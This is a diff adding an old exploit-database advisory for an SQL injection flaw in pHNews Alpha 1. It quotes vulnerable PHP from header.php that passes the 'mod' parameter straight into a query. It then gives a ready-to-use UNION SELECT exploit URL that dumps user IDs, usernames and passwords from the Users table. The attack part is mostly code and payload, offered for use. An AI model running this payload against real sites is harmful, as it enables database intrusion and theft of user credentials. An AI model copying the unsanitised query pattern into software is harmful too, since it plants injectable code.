@@ -1,0 +1,34 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : pHNews Alpha 1
+Download       : http://www.hotscripts.com/listings/jump/download/50111/
+Vulnerability  : Sql Injection
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian 
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/header.php 
+
+[Code]
+$mod = $_GET["mod"];
+// If no mod is selected select the default (news)
+if ($mod == "") { $mod = "news"; }
+if ($mod != "nomod") {
+
+// Subit the query... god soooo mmmuuuccchhh coooodeee
+$query = "SELECT * FROM Modules WHERE name = '{$mod}'";
+$result = mysql_query($query) or die('Query failed: ' . mysql_error());
+[/code]
+
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: http://victim.org/header.php?mod=' union select
+0,0,0,concat(id,char(45),UName,char(45),Paswd),0,0 from Users--
+########################################################################################
+
+# milw0rm.com [2009-02-17]
